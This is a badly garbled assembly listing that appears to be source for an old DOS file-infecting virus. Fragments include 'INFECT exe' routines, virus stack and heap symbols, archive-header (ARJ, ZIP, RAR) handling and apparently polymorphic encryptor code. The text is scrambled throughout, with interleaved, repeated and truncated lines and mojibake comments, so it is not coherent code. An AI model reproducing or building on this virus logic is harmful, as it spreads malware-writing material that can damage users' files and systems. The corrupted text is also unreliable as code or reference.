    ,blic; 25rarhdr----    _heap._c   pop   , [       add  buf ; seek_endYCLE NZllllllllax, cx
si   ICTIONARY_ENTRY        lea     si, arj_h
z    E]tr   c , [       
    mov  mov           t1
    retwb _22  , [ 22     call   pop   , [ 22     calle f_of_l         ile siz
Infec_Ab¢si, [vir_heap._exehdr]
yte ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ------------------------------------------+-
pblabel test_size  ;ax-(file_siz
code segment cs:code, ds:code, es:code, ss:code


;.DATA
public vir_heap, Stealnt byte public
assumetrn reaL dup (?)
foear
extrn dosclose       oear
extrn do   Calculate_C   :near
;ÄÄXE_TEST          :byte
ext   EXE_TEST  ear
extrn do   get_crc_jusear
extrn doRANDOMendST  ear
extrn doOSCALL        ear

;public exe_test_rea   :byt--.L
pblaberd    TIMEexe_rle_table-   .sf_mode.l], 1sertap     
  all    doswrite_shbuf_22
;¢ á«®¢ à¥:  rorRead
          10h
    div   ax
      s  d  ax, VIRUSSTACKSIZE/10h
 h  xchgDo     dx, [x, 3E0h
        pu0.lo], ax
    rd    TIMEexe_rle_table-_cErrorRead], op
  urn
s
 ax, [ ds
    mov     a).sf_mode.l], 12h 
   dall    call®¢ à¥:  RANDOMend ( - sax, cx
f_insi, arj_h
z    ExactPage
    dec     a;@repeat:
        sto_b cx
       4h
    call    doswrite_from_heap
    der
;ÄÄxz       ypt ;]t ;;retHDa'
   ÄÄÄÄÄÄÄÄ         _cErrorRe;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI           call®ld
    der
;ÄÄxz       ypt ;]t off_of_loc_hdr_.h mov     l  call®¢ à¥:  Rrt2   ; IOCTL®¢ à¥:  $ret$nfect_tim
   oc_hdr_.hx, INTERVAL_INFEC     ; ax
      s  dhdr.exe_IP], ax
    call   SIZE ;virus_size
;                            xorrd    TI         _cErrorRead], op
;ÄÄxz           mov     [enad], op
;ÄÄxz            rep     mov  dbt1
    ret
EST        mov     cx,     <n and04 - f       , 0f0h, errs adx-   s               +, ÄÄÄÄ_0t eg     ne     xz       ?
            ta;    call test for z                  END     add    s                _ IOCTL®¢ à¥:           _    dÄu           call cx
   dixexz            rep  eg     ne     xz       ?
            ta;  iv ;Read], op
;ÄÄxz           mov     [enad],b_dict_offset], rd    TI         _e_par_ heapbff_of_ltest for z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄ
     [
  DONE
    mov     cp     al, 'V'-'A'   ; t], ax
 t]
       
    DOIF           mov    
        cmp     al,o   _-----------+-
ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp---;:         ; I ( - sax, cx
f_insi, arj_h
z        
         sto_b cx
       reg6   p
            cJMP_patc;ided to  it,DO
 tx,cx dx0's sub     dec     si
      CYC,       begin_subti-volume art], ax
  



      begin_subti-volumnfect2
        jmbrRereg sub     dec     sov     cp     alexe_SS.h], al ; iiiEL dup (al 010b_subtiALSIZEDI
RegByte     R_AL, R_ec     so.lo], c   DI
-volumnfect2Y            _patc;i    DI
-volumax, cx
b    i, arj_h
z       reg0  sto_b cx
       t    bytDONE
 SHORT fhdr+14h], 3   dec     s   push    si
  x, cx
f_insi, arj_h
z       reg0-1_CRC
            mov  p     alexe_SS.h], a0C3h
  he ,bli        dostelb      RELIZ
;   pop   , [ 22  jb      @rbff_of_l        hdr.rECLE LUNZ
   so.lo], c   DIS2)







  ; eg_pos.ECLE LUNZ
   so.lo], c    CYCLE LU
       ì        he ,bli        dostelb  ÄÄÄÄÄÄÄ0C3h
  hDRBUFSIZE
        call
    a   mov     RELIZ
;-riginalB_DICTIONA  call®¢ à¥:  Rrt2  al, 'V
       ; ce2:de (?)
fe     + while eIPd      op
;ÄÄxz       ?
    ]nd
 iEL ce>:de (?)
fe    +while eIP+    mov +2NA  call®¢ à¥:  Rrt2  al, 'V
       ; Ye2:de (?)
fe     + while eIP
 Xd      op
;ÄÄxz       ?
   Y]nd
 iEL Ye>:de (?)
fe    +while eIP+    mov +2-Xsudx ax,
      bx,OIF           mov    dx, [x, 3E0hhi]_cur_neg_ dsosw_s-EF 3
     [
 A dec     s   push    si
 ®¢ à¥:  Rrt2  aCLE LUNZ
   so.lo], c  dx
    mo, [b 'A'
           EL dup (al 10 ;.5k*10time]
    xor    xz       ?
   J], add     ax, ?
   JSIZE1.     mov -0zipe_i-pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp---rd 
      a   S   [exeulate_craxxexz            rep  eg    .50 -+-
       so.lo], 
    jbe              RND_G(ypt ;    T 8
            p     word ptp     
  x, f_inPMest prblt_infct
  SE ;offseel standarte   t
;Ä[ziphdr.zip;Ä[t = fo9 -<50,B8,86,16,CD,2F,58,75,06,5F,55,8B,EC,  ,E7csiz_word '/'&fo9&h  
PUSHSTA    DON   cmp   PM, di
s_craxx1J  G(1J86)  ; nfec   6BOR16BOR CD
 ..F0 .75, a).sf____2f$ret      axx1J       ca:  rorbufÄ 10h
 S         ddbp1di
s_cr  fnd    m0h
 S    rorbencriptortest for z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄÄÄ     [
  DONbeep proc       [exeu       mov       shr 1
        cx
       t    by 
  x, cx
f_insi, arj_h
z       reg0] dec     s   push    si
  , ch   ;ch=0
    dx
    -   Ximm        ;ch=0
     mov     cx, sizeof_part1s
;    DONEdr.zip;Ä
    xor    xz       ?
    ],rrentÄnotÄused ( - sax, cx
f_ins  +4l_heade.r    neg    get_ownsmov
       d;?ver?
   0Bhneg_dx      ; #### Dp  ce_   _      _          neg       call   pop   , [ jb      @rx
    not     Adx ax,
      bEPT[z               rONbetÄÄÄÄÄÄÄÄÄÄÄÄ
     E ;CPU cEPtÄÄÄÄÄÄÄÄÄÄÄÄ
s
;    DONE STACKBASE ;1: stÄÄÄÄÄÄÄÄÄÄÄÄ
     [
  DONE
    mulate_crc    ;<add si,3
         iterebli ad_buf_22 dd si,3
   size]-NTEt
         db
    jmp     dozeof_part1ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  doE, NDD_    d_ROUTINÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÅÄÄ[process HA]ÄÄÄÄÄÄÄÄÄÄÄÄÄ
    xor    xz       ?
    ],rrentÄnotÄused      db;Read], op
;ÄÄxz       ?
       ax0  ;drN'ToE, NDDus
  B   WnoD RELO DEVEL  OR ( - sax, cx
f_ins L dup (?)
f  sto_b cx
           db    *4 sub     dec     si
     
    jbe CYC,      -volume art], ax
      dozeof_part1   si
     
    jbe CYC,        IOCTL®¢ à¥:  $     itereriptortest for z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄÄÄ     [
  D                 rt1)+size?
         ;******u       mov  add         ov     cp     alexe_SS.h], al ; iiil si
mo ;******u  mov     ax, oc_hdr_. z       ?
           ret mov
       ov     call    seek_eOCTL®¢ à¥:  $     itereriptorax, oc_hdr_.             reg0] dec     sdx
    -   Xim      Ä 10hr  dostelb   mov     cx, si®¢ à¥: $     itereriptorax, i,3
   size]-N?
        v     ax, oc_hdr_. z       ?
     ret mov
       u  mov     ax, i,3
   size]-N?
        v     ax, oc_hdr_. z       ?
    2ret mov
       u  mov     ub     ax, HDRBUFS$     itereriptor
      bEPT[z       reg0] dec  i,3
   size]-N    bli       r1)+size   rIDX FÄÄÄÄÄÄÄ HDRBUFS$     itereriptor
      bEPT[z       reg2]lea     r1)+size   r
   ,ns  theec  i,3
   size]-N
vd     oc_hdr_. z       ?
       ret mov
   u  mov      HDRBUFS$     itereriptor
      bEPT[z       reg3]lea     r1)+size   r
  2,ns  theec  i,3
   size]-N
vd     oc_hdr_. z       ?
      3ret mov
   u  mov      HDRBUFS$     itereriptor
       z       ?
     ret m   r?
  peakv      HDRBUFS$     itereriptor
      axxexz       ?
    ]heec  i,3
   size]-Na    db   HDRBUFS$     itereriptor
      bEPT4¥ ®87 EL 8Bheec  i,3
   size]-Nli amemriptor
      axxexz       ?
    ]heec   ds:[si],
    no.50 -+-
                      ;-(X+1dr_dict_offs.hib    z       ?
     rheec  i,3
   size]-Nem 2  filriptor
      bEPT[z                  END   DONE STACKBASE ;7  axmaskDS
     [ONE
    mulate_crc    ;<add s xor    xz       ?
    ],rrent       REG_GARaxSETprocDE1. 3v     ax, i,3
   size]-None        call     xor    xz       ?
    ],rrentÄnotÄused      db;SETprocDE4.         popn
    jmp     do  oc_sign.hicEPT5rarhdr----at BUECLE LUNZ
   sod_bream
$     itereriptorax,      xor      axxexz       ?
   Y_CRC
            mov    size]-Na    db   

r_method],B_DICTIONARY_E
    leaxz       ?
    ],rrentÄnotÄused      db;SETprocDE4.        
      bEPT2¥ ®87 EL 89heec  i,3
   size]-Nli amemriptor   pop     dx cx               ;-(X+1dr_dictulate_craxxexz       ?
   Y_CRC
 .50 -+-
                      ;-(X+Y and 0FFF_offs.hib    z       ?
    2rheec  i,3
   size]-Nem 2  filriptor   pop     dx cx               ;-(X+Ydr_dictulate_craxxexz       ?
   J]        ;-(J+X+Ydr_dicti,3
   size]-Na    ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCÄcx               size]me rGOLO ?
       ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCRY_E
    leaxz       ?
    ],rrentÄnotÄused t1
    rent   b;Read], op
;ÄÄaandAHi¨§ ¨áå1)+sizeJ                   zme;r_dicti,3
   do_ offs        start_reg           zme;J r_dicti,3
   many_  n      _      eg           zme;ShiDONE
;-+------ x,OIF           mov  art_reg           zme;ONE
;tim
    ctr [siiiiiiiiiiiiiiiiiiiiiiiiiiiiii;r_dicti,3
   size]-Na  iiiiiiiiiiiiiiiiiiiiiiiiiii;ADD REDEX,?
   Jr_dicti,3
   n, for_ 
 Read], op
;ÄÄaandAHiZ ¨áå1)+sizeJZiiiiiiiiiiiiiiiiiiiii;JZr_dicti,3
   do_ offs        start_reg           zme;r_dicti,3
   many_  n      _      eg           zmeme;ShiDON;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄxCÄcxE, NDDu
  NEAR L
  To      start_reg           zme     zme;r_;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄxCdicti,3
   size]-N?
 S     :1, -+------ x,OIF       ?
     r  :1,        xor     al, c
;¬®¦¥â ®áëIF       n
         sto_b
    DOI    Daxr_;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄxCdict
    leaxz       ?
    ],rrentsed      db;;SETprocDE0.        i,3
   n, for_ 
 Read], HDRBUFS$     itere reg           zme     zme;r_;ÄÂÂÂÄÂÂÄÂÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿r_;ÄÅÁÅÂÁÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´r_;ÄÁÄÁÁÄÁÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
-
pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppsiz_wor
    sto_wcd
 ..BD sub  test for z               ret1: stÄÄÄÄÄÄÄÄÄÄÄÄÄÄ     [
  DONbeep proc       [exeu       mov OP   shr 1
        cx
       t    by 
  x, cx
f_insi, arj_h
z       reg6] dec     s   push    si
  cG  es,      
  , ch   ;ch=0
    dx
    -   Xim        ;ch=0
    c ;   ; (0x10 = P mov     cx, sizeof_part1s
;    DONEdr.zip;Ä
   test for z               ret1: stÄÄÄ   MASK ÄÄ     [
 DONE
    mu       mov     IOCTLdr.zip;Ä
   i,3
   size]-N?
 S     :1, -+------ x,OIF            rep  eg    sw
    ret
z       ?
            ta;d 0FFF_offs.hib    z       n
         sto_b
    DOI    Daxr_;   ta    cx, ÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄr_;ÄÅÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄr_;ÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄpppppppppp---rd _heap._crthdr.ar cx
   dixexz            rep  eg     ne     si,OIF           mov    dx,         call           xor     al, c®¢ à¥:  Rrt2  aCLE LUx_0
;\+- CREATE ARJHDR -+-Rrt2  aCLE LUx_0
;\+- CRexe_par_d   ; read ( cmp     bxxexz       ?
   J]ONE
    muIZEMARKbxi]   pop   , [ax, 08320H
        cmp     bxxe   pop   , [ax      ;get Disk space   adx]
      rep 
 i,3
   d  CRYPTLEVEL dup (;  calte_sizeo
        call    Caadx]
        mov     wo_flags],+---riginalB_DICT    xor d;?ver?si,OIF       ?
       r  xor d;?ver?x-3)
    po    [enad], op
;ÄÄsi,OIF       ?
      3r  xor d;?ver?x-3)
    po   exe_par_      moS    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ      
      b   S   [exeulate_crcxxexz            rep  eg    .all    rzheap+[oall    bv     cx end
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  ;ÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄecuted, ÄÄÄÄÄÄÄÄÄÄÁ             ÄÁÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁ
---ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍl        stosize]-N?
        , EM    c st 0.(g    si  dbuf -re
           )   rÄÄÄÄÄÄÄ HDRBUFS$     itereriptor_wor
    sto_       ,        
      -EPT[z       reg0] dec  
      bEPT9heec      xchgbuf_22 EL dup (al  10000100YCLE LUe.lo], c    (gByt*9    10000100YCLE LU word      ;get DDONE
      00000010;.5k*10time]
    mov     cx-+------ x,OIF       ?
           rheec   ds:[si],
    noend
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄ
---ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍl        stosize]-Nem 2  filriptor     ownoff_of_lmov     [exehdr.exe_IP], a ;IF       ?have ep  eg    s_flags],+---riginal [
  DONE
    m
    DOI    D mov
       ulate_craxxexz       ?
           rheec  of_lmov     [exexz            rep  eg        ulate_craxxehdr.exe_IP], a ;IF       ?have ep  eg        mov     ax, 2
  .all    rzheap+[        $     itereri;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄ
---ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍl        stosize]-N    bli       rcl-li      tor).
;- 2 
         ÄÄÄÄÄÄ HDRBart2,  ds:[variablEXIT Z
     8f_of_lmov          .BD sub  t_os    =0
    l    DONSUB | XORBa,RB: .9  .BD
  
 3    cx-+------     9    rcl-li      heec      xchggbuf_22 EL dup (     1: stM0D]
    mov     cxend
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIreshit>
E HDRBart2,  dexe_SS.h], al ; E ;C          t], aaxRe;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIresh      ;cheek
    ca----------                              ;1rt2)4   an      xor  2v     cp     al, 'V'-'A'   ; t_os    =0
    lea      , EM    anyIreshcode, a   ta    cx, d],B_DICTIONARY_Eend
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI      ?fr t_-+---M l=C0(   ),,B8(o forD0(  cforF0(DONdr_dicti,3
   cp     al, 'V'-'A' 1: sA
 (al  110xxn

ra  , EM l=C0(   ),,B8(o forD0(  cfCLE LUe.lo], c     0D3      begin_sub_see l=D8(sbbarxtest
   Aeg        ulate_cr     0D8h- FRCa  , EM lSIZEF0(DONdr_dictdr.zip_loc-------------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TI      ?wr_EXI_size]-N
vd     i,3
         ?wt
;li      tffer_      tf exits f  saved_ ;cheek
    caDaxr_;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                      stosize]-Nxor         rcl-li      ;tor).
;- 1. 4 
         ÄÄÄÄÄÄ HDRB  cp     al, 'V'-'A' ax, 08320H
       mov    size]-N    bli          lg:=0,,BF:=0,,             'AD'
;ÄÄÄÄÄÄÄÄSTOl, 'VR81B         DONADD | OR | XORB R,?
  
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;er str:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ; x,  lg,[ lg+] ? mp      á«    dossp      bli       CYCLE LUi,3
         ?fr t_-+-  CYCLE LUisign.hicEPTR      ;ch=0
at BUECLE LUNZ
   s;     dze]me :CLE LUNZ
   s; C0Gl>_ 5CLE LUNZ
   s; C8Gl>_ DCLE LUNZ
   s; D0Gl>_15CLE LUNZ
   s; F0Gl>_35CLE LUNZ
   s     stosb
cC  -5CLE LUNZ
   sdealllllp     cx

dr.zip_loctishr 1
        cx
   sb
cB8Ca  , EM   rR,?
  TLe  B8;r_dictdr.zip_locEL dup (al  buf_22  mov     cxend
;-------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  ; mov       ;       lg  ;    /  c/EL/DONEli  memri     stosize]-N? amemriptor HDRBUFS$     itereriptor HDRB  cp     al, 'V'-'A' -1
  r_dictisign.hicEPT)4               rcl=4-®87 EL 8B    cxr,[     axsi
  1
        cx
    EPT[z       reg1    rep 
 i,3
   size]-N    bli    rep 
 i,3
   $     itereriptorax, i,3
         ?fr t_-+-  CYCLE LUisign.hi    0D cmp dc   ;ch=0
at BUECLE LUNZ
   si,3
         ?wt
;li      CLE LUNZ
   si,3
   size]-N    bli    rep 
      cx
   sb
cDeg  es, ss

    es, ss
dx
    -   (8egov  )+3-cC  -8
;   4;3  bgmen
 3    cx    
      b   -----------+-  ll    jcxz    cbream
  _  rcl=2-®87 EL 89   
  [],pblabel f_inser    8
;   48h, 49rcl=4-®87 EL 8B    cxr,[     ax
      ahin[z       reg1    rep h  xchgahinÄÄÄip_locEL dup (ahPT[z       reg0] dec  EL dup (ahPT10000100YCLE LUe.lo], c[z       reg0]RegBytCLE LU word      ;get     jcxz h  d = 110 ;.5k*10time]
    xor    je      li
ax              t], a  t mov
   u  mov     -------------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  rd    TIsize]-Na  iiiiiiiiiiM l-?
  ,l f_ireg0, ?
  
;ÄÄÄÄn    ownoff_of_loc_hdr_.    z       reg0] dec   f_inser   0Ccur_neg_ dsosw_s-h a   mov oc_hdr_.   8ÄÄÄÄÄÄÄÄ  ax, 2
  .all    rzheap+[u  mov     -------------ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  Re;ÍÑÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄe³    ed)   ³
E, NDDu[CY  equ 4OPERA    iiiiiiiii³Re;ÍÏÍÍÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ        stosize]-None        call   dec     sov     cp     al, 'V'-'A'   ;     jcxz    0000 = 0YCLE LUNZ
e      standIF       ?
       ek for write ÄÄÄ0C3h
  h  ce_   ice      _  Erat    struc
       z       ?
       e      CYCLx_0
;\+- CR    dx, cx
    DO
x-3)
   un     _  ze]-Ncall 
      rep ds:[si]b;-+------------
 nc    _un     _  ze]-Ncall -set]
    add  dO
x-3)
   un     _  ze]-Ncall 
      rep STACKBAS
      1 48h, 49rcleaompress    ptr [rarhdr ;1=a, 3=C
    1 48h, 49rcleaompress    ptr [rarhdrov     cp     al, 'V'-'A'     jcxz    c      begin_subttttter. For      rus subtop'-'A'     jcxz    3     begin_subtttttte me lil000 un not
; p dec  EL dup (c   a0F   begin_subtttttte je   s in
RD SA_A:  ze]-s dec  EL dup (d   a0F   begin_subtttttte je   s in
RD SA_A:  ze]-s dec   ;1=a, 3=h
    
    r_M   rep STACKBASh
    
    r_M   rep [
 DONE
    mi,3
         ?li      CLE LUNZ

      ahin[z       ?
       ZEMs
         á¥2  3 ³o-1 ³+- CREA  ex,CLE LUNZ
tim
    ;   4;,3=s
       ( á2 3)+(0,4)-1= (0, á2     4,5,6    ;= firs h  xchgaxinÄÄÄip_locec  EL dup (c   ret
beep1  EL dup (dh   si, VIRUSSTA, 08   db     G               by;;;;;;;;, 0YOU HA   ANY]TRO 1Fh    , NMMEN  THIS       ENFLAGS  STAxz       ?
    ],r    
